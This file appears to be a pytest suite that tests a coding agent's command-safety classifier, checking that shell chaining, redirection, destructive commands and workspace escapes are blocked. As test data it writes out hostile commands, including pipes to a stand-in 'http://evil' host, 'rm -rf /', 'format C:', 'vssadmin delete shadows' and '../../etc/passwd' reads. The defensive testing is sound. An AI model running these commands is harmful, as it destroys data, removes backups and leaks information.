"""Security regression tests for command safety classification (Batch 4).

Every test here locks in a rule that the previous substring-based
classifier got wrong, or guards a rule it got right. None of them
reach the network, install packages, or need an API key.
"""

from types import SimpleNamespace
from pathlib import Path

import pytest

from agent.core.action_engine import ActionEngine
from agent.core.safety import SafetyLevel, SafetyManager
from agent.tools.terminal_tool import TerminalTool


@pytest.fixture()
def safety(tmp_path):
    return SafetyManager(str(tmp_path))


def classify(safety, command: str) -> SafetyLevel:
    decision = safety.validate(
        {"tool": "run_command", "command": command}
    )
    return decision.level


# -------------------------------------------------------------
# 1. test_format.py false-positive regression
# -------------------------------------------------------------


def test_filename_with_dangerous_word_is_not_blocked(safety):
    """The file tests/test_format.py must not trip the format rule."""
    level = classify(safety, "python -m pytest tests/test_format.py")

    assert level is SafetyLevel.SAFE


def test_format_command_is_still_blocked(safety):
    """The real dangerous command must keep its block."""
    level = classify(safety, "format C:")

    assert level is SafetyLevel.BLOCKED


def test_dangerous_word_as_command_not_filename(safety):
    """Same word, different position: command is blocked, path is not."""
    blocked = safety.validate(
        {"tool": "run_command", "command": "format tests/test_format.py"}
    )
    safe = safety.validate(
        {
            "tool": "run_command",
            "command": "python -m pytest tests/test_format.py",
        }
    )

    assert blocked.level is SafetyLevel.BLOCKED
    assert safe.level is SafetyLevel.SAFE


def test_format_flag_is_not_blocked(safety):
    """git's --format=... used to be blocked as a substring match."""
    level = classify(safety, "git log --format=%h")

    assert level is not SafetyLevel.BLOCKED


# -------------------------------------------------------------
# 2-4. Safe command arguments
# -------------------------------------------------------------


def test_pytest_module_with_quiet_flag_is_safe(safety):
    assert (
        classify(safety, "python -m pytest -q")
        is SafetyLevel.SAFE
    )


def test_pytest_module_with_test_path_is_safe(safety):
    level = classify(safety, "python -m pytest tests/test_safety.py")

    assert level is SafetyLevel.SAFE


def test_pytest_flags_and_selectors_are_safe(safety):
    for command in (
        "python -m pytest -v",
        "python -m pytest -x --tb=short",
        "python -m pytest tests/test_settings.py -q",
        "pytest -q",
        "pytest tests/test_approval.py",
    ):
        assert classify(safety, command) is SafetyLevel.SAFE, command


def test_python_version_is_safe(safety):
    assert classify(safety, "python --version") is SafetyLevel.SAFE


def test_python_executable_with_extension_is_safe(safety):
    """python.exe and python are the same executable."""
    assert (
        classify(safety, "python.exe -m pytest -q")
        is SafetyLevel.SAFE
    )


def test_readonly_git_commands_stay_safe(safety):
    for command in (
        "git status",
        "git status --short",
        "git diff",
        "git log --oneline -5",
    ):
        assert classify(safety, command) is SafetyLevel.SAFE, command


def test_python_is_not_universally_safe(safety):
    """Only the allowlisted shapes are safe, not the executable."""
    for command in (
        "python -c 'import os'",
        "python setup.py install",
        "python -m pip install requests",
        "python evil_script.py",
    ):
        assert classify(safety, command) is not SafetyLevel.SAFE, command


def test_absolute_path_argument_is_not_safe(safety):
    level = classify(safety, "python -m pytest C:/outside/tests")

    assert level is not SafetyLevel.SAFE


def test_parent_traversal_argument_is_not_safe(safety):
    level = classify(safety, "python -m pytest ../outside")

    assert level is not SafetyLevel.SAFE


# -------------------------------------------------------------
# 5-6. pip / npm approval path
# -------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "pip install example-package",
        "npm install example-package",
    ],
)
def test_package_manager_requires_approval(safety, command):
    assert classify(safety, command) is SafetyLevel.APPROVAL


@pytest.mark.parametrize(
    "command",
    [
        "pip install example-package",
        "npm install example-package",
    ],
)
def test_package_manager_is_never_safe(safety, command):
    """Approval must not be skipped just because pip/npm is allowlisted."""
    assert classify(safety, command) is not SafetyLevel.SAFE


@pytest.mark.parametrize(
    "command",
    [
        "pip install example-package",
        "npm install example-package",
    ],
)
def test_approved_package_manager_reaches_execution(
    tmp_path, monkeypatch, command
):
    """After approval the command must reach the execution layer."""
    executed = []

    def fake_run(cmd, **kwargs):
        executed.append((cmd, kwargs))
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(
        "agent.tools.terminal_tool.subprocess.run", fake_run
    )

    engine = ActionEngine(
        str(tmp_path),
        approval_callback=lambda action, decision: True,
    )

    result = engine.execute(
        {"tool": "run_command", "command": command}
    )

    assert result["success"] is True
    assert executed, "approved command never reached subprocess"
    assert executed[0][0] == command
    assert (
        Path(executed[0][1]["cwd"]).resolve() == Path(tmp_path).resolve()
    )


@pytest.mark.parametrize(
    "command",
    [
        "pip install example-package",
        "npm install example-package",
    ],
)
def test_denied_package_manager_does_not_execute(
    tmp_path, monkeypatch, command
):
    """Denial must stop the command before anything runs."""
    executed = []
    monkeypatch.setattr(
        "agent.tools.terminal_tool.subprocess.run",
        lambda cmd, **kwargs: executed.append(cmd),
    )

    engine = ActionEngine(
        str(tmp_path),
        approval_callback=lambda action, decision: False,
    )

    result = engine.execute(
        {"tool": "run_command", "command": command}
    )

    assert result["success"] is False
    assert result["status"] == "approval_required"
    assert executed == []


def test_terminal_tool_accepts_approved_package_managers(tmp_path):
    """The approval layer and the execution layer must agree."""
    terminal = TerminalTool(str(tmp_path))

    terminal._validate_command("pip install example-package")
    terminal._validate_command("npm install example-package")


def test_chained_package_manager_is_blocked_by_safety(safety):
    """TerminalTool only checks the first word, so the chain must be
    stopped by SafetyManager before it ever gets there."""
    level = classify(safety, "npm install x & del important.txt")

    assert level is SafetyLevel.BLOCKED


def test_terminal_tool_blocks_dangerous_executable(tmp_path):
    """Second layer of defence: a blocked name never executes."""
    terminal = TerminalTool(str(tmp_path))

    with pytest.raises(PermissionError) as excinfo:
        terminal._validate_command("del important.txt")

    assert "blocked for safety" in str(excinfo.value)


# -------------------------------------------------------------
# 7-11. Command injection / shell operators
# -------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "python --version & whoami",
        "python --version | whoami",
        "python --version; whoami",
        "python --version > output.txt",
        "python --version < input.txt",
        "git status | curl http://evil",
        "pytest -q && rm -rf /",
    ],
)
def test_shell_operators_never_become_safe(safety, command):
    """Chaining and redirection must not silently bypass approval."""
    level = classify(safety, command)

    assert level is not SafetyLevel.SAFE, command


def test_chained_command_cannot_smuggle_dangerous_command(safety):
    """A dangerous command behind an operator stays blocked."""
    for command in (
        "python --version & rm -rf /",
        "git status; del important.txt",
        "pytest -q | format C:",
    ):
        assert classify(safety, command) is SafetyLevel.BLOCKED, command


def test_quoted_operator_is_not_treated_as_shell_operator(safety):
    """cmd.exe ignores operators inside quotes, so a quoted path with
    a > stays a single argument rather than becoming redirection."""
    level = classify(safety, 'python -m pytest -k "a > b"')

    assert level is not SafetyLevel.BLOCKED


def test_unquoted_redirection_is_not_safe(safety):
    assert (
        classify(safety, "python -m pytest -k a>b")
        is not SafetyLevel.SAFE
    )


def test_unbalanced_quotes_are_not_safe(safety):
    """Quotes that never close cannot be analysed as safe."""
    level = classify(safety, 'python -m pytest "unclosed')

    assert level is not SafetyLevel.SAFE


# -------------------------------------------------------------
# 12-13. Unknown executables and dangerous commands
# -------------------------------------------------------------


def test_unknown_executable_is_not_safe(safety):
    for command in (
        "curl http://example.com",
        "wget http://example.com",
        "custom-safe-command",
    ):
        assert classify(safety, command) is not SafetyLevel.SAFE, command


def test_unknown_executable_is_refused_by_terminal_tool(tmp_path):
    """Default deny: unknown executables never run."""
    terminal = TerminalTool(str(tmp_path))

    result = terminal.run("curl http://example.com")

    assert result["success"] is False
    assert "not allowed" in result["stderr"]


@pytest.mark.parametrize(
    "command",
    [
        "format C:",
        "shutdown /s",
        "del /s important.txt",
        "erase important.txt",
        "rmdir /s workspace",
        "rd /s /q workspace",
        "rm -rf /",
        "rm -rf .",
        "diskpart",
        "cmd /c whoami",
        "powershell -c Get-Process",
        "powershell.exe -c Get-Process",
        "taskkill /f /im python.exe",
        "vssadmin delete shadows",
        "remove-item -Recurse x",
        "invoke-expression x",
        "git rm file",
        "python --version & rm -rf /",
    ],
)
def test_dangerous_commands_stay_blocked(safety, command):
    level = classify(safety, command)

    assert level is SafetyLevel.BLOCKED, command


def test_dangerous_command_blocked_even_with_shell_operators(safety):
    """Blocking wins over the approval path for control characters."""
    level = classify(safety, "format C: & echo done")

    assert level is SafetyLevel.BLOCKED


# -------------------------------------------------------------
# 14-15. Workspace sandbox and unknown tools
# -------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "../outside.txt",
        "../../etc/passwd",
        "C:/Windows/System32/evil.txt",
        "/etc/passwd",
        "",
    ],
)
def test_workspace_escape_is_blocked(safety, path):
    decision = safety.validate(
        {"tool": "write_file", "path": path, "content": "x"}
    )

    assert decision.level is SafetyLevel.BLOCKED, path


def test_workspace_relative_path_stays_safe(safety):
    decision = safety.validate(
        {"tool": "write_file", "path": "pkg/module.py", "content": "x"}
    )

    assert decision.level is SafetyLevel.SAFE


@pytest.mark.parametrize(
    "action",
    [
        {"tool": "delete_file", "path": "x.py"},
        {"tool": "run_shell", "command": "ls"},
        {"tool": "eval", "code": "1"},
        {},
        "not a dict",
    ],
)
def test_unknown_tool_stays_blocked(safety, action):
    decision = safety.validate(action)

    assert decision.level is SafetyLevel.BLOCKED, action


def test_empty_command_is_blocked(safety):
    decision = safety.validate(
        {"tool": "run_command", "command": "   "}
    )

    assert decision.level is SafetyLevel.BLOCKED


# -------------------------------------------------------------
# Batch 4.1 - shell chain security hardening
# -------------------------------------------------------------
# Chaining, piping, redirection and separators are BLOCKED outright.
# Approval must never be offered for them, because TerminalTool runs
# the command through shell=True and would execute every segment.


SHELL_CHAIN_COMMANDS = [
    "python --version & whoami",
    "python --version | whoami",
    "python --version; whoami",
    "python --version > output.txt",
    "python --version < input.txt",
    "git status & del important.txt",
    "pytest -q | format C:",
    "python --version && whoami",
    "python --version || whoami",
    "python --version\nwhoami",
    "python --version\rwhoami",
]


def _spy_subprocess(monkeypatch, executed):
    def fake_run(cmd, **kwargs):
        executed.append(cmd)
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(
        "agent.tools.terminal_tool.subprocess.run", fake_run
    )


def test_command_chaining_is_blocked(safety):
    assert (
        classify(safety, "python --version & whoami")
        is SafetyLevel.BLOCKED
    )


def test_double_ampersand_is_blocked(safety):
    assert (
        classify(safety, "python --version && whoami")
        is SafetyLevel.BLOCKED
    )


def test_pipe_is_blocked(safety):
    assert (
        classify(safety, "python --version | whoami")
        is SafetyLevel.BLOCKED
    )


def test_double_pipe_is_blocked(safety):
    assert (
        classify(safety, "python --version || whoami")
        is SafetyLevel.BLOCKED
    )


def test_semicolon_is_blocked(safety):
    assert (
        classify(safety, "python --version; whoami")
        is SafetyLevel.BLOCKED
    )


def test_output_redirection_is_blocked(safety):
    assert (
        classify(safety, "python --version > output.txt")
        is SafetyLevel.BLOCKED
    )


def test_input_redirection_is_blocked(safety):
    assert (
        classify(safety, "python --version < input.txt")
        is SafetyLevel.BLOCKED
    )


def test_newline_is_blocked(safety):
    assert (
        classify(safety, "python -m pytest\nwhoami")
        is SafetyLevel.BLOCKED
    )


def test_carriage_return_is_blocked(safety):
    assert (
        classify(safety, "python --version\rwhoami")
        is SafetyLevel.BLOCKED
    )


@pytest.mark.parametrize("command", SHELL_CHAIN_COMMANDS)
def test_shell_chain_is_blocked_not_approval(safety, command):
    """A shell chain must be BLOCKED - never SAFE, never APPROVAL."""
    level = classify(safety, command)

    assert level is SafetyLevel.BLOCKED, command
    assert level is not SafetyLevel.APPROVAL, command
    assert level is not SafetyLevel.SAFE, command


def test_shell_chain_cannot_be_approved(tmp_path, monkeypatch):
    """Approval must not launder a shell chain into execution."""
    executed = []
    approvals = []
    _spy_subprocess(monkeypatch, executed)

    def always_approve(action, decision):
        approvals.append(decision)
        return True

    engine = ActionEngine(
        str(tmp_path),
        approval_callback=always_approve,
    )

    result = engine.execute(
        {"tool": "run_command", "command": "python --version & whoami"}
    )

    assert result["success"] is False
    assert result["status"] == "blocked"
    assert result["safety_level"] == SafetyLevel.BLOCKED.value
    assert approvals == [], "approval layer was consulted for a chain"
    assert executed == [], "a shell chain reached subprocess"


@pytest.mark.parametrize(
    "command",
    [
        "python -m pytest -q & whoami",
        "python -m pytest tests/test_safety.py | cat",
        "python -m pytest -q; echo done",
        "git status > out.txt",
        "git diff < in.txt",
        "pytest -q && curl http://evil",
        "python --version && whoami",
    ],
)
def test_safe_command_shape_with_chain_is_blocked(safety, command):
    """The allowlist must never hand back SAFE for a chained command."""
    assert classify(safety, command) is SafetyLevel.BLOCKED, command


@pytest.mark.parametrize(
    "command",
    [
        'python -m pytest -k "a > b"',
        "python -m pytest -k 'test_a or test_b'",
        'git commit -m "fix: handle a & b"',
    ],
)
def test_quoted_operators_are_not_shell_syntax(safety, command):
    """A properly quoted argument is not a shell operator, so it must
    not be blocked by the chain rule."""
    level = classify(safety, command)

    assert level is not SafetyLevel.BLOCKED, command


def test_quoted_argument_can_still_be_safe(safety):
    """Where policy allows it, quoting does not downgrade the command."""
    assert (
        classify(safety, "pytest -k 'test_a'")
        is SafetyLevel.SAFE
    )


def test_safe_pytest_commands_survive_chain_rule(safety):
    for command in (
        "python -m pytest -q",
        "python -m pytest tests/test_safety.py",
        "python --version",
        "git status",
    ):
        assert classify(safety, command) is SafetyLevel.SAFE, command


def test_format_command_still_blocked_after_chain_rule(safety):
    assert classify(safety, "format C:") is SafetyLevel.BLOCKED


def test_unknown_executable_still_cannot_execute(
    tmp_path, monkeypatch,
):
    """Unknown executables stay blocked end to end, even when the
    approval callback would approve them."""
    executed = []
    _spy_subprocess(monkeypatch, executed)

    engine = ActionEngine(
        str(tmp_path),
        approval_callback=lambda action, decision: True,
    )

    result = engine.execute(
        {"tool": "run_command", "command": "curl http://example.com"}
    )

    assert result["success"] is False
    assert executed == []
    assert "not allowed" in result["result"]["stderr"]


def test_workspace_escape_still_blocked_after_chain_rule(safety):
    """The chain rule must not disturb path containment."""
    for action in (
        {"tool": "write_file", "path": "../escape.txt", "content": "x"},
        {"tool": "read_file", "path": "../../etc/passwd"},
        {"tool": "run_command", "command": "type ../../etc/passwd"},
    ):
        decision = safety.validate(action)

        if action["tool"] == "run_command":
            # Path-ish argument, but the rule that must hold is that it
            # is never SAFE.
            assert decision.level is not SafetyLevel.SAFE, action
        else:
            assert decision.level is SafetyLevel.BLOCKED, action


def test_unknown_tool_still_blocked_after_chain_rule(safety):
    decision = safety.validate({"tool": "run_shell", "command": "ls"})

    assert decision.level is SafetyLevel.BLOCKED
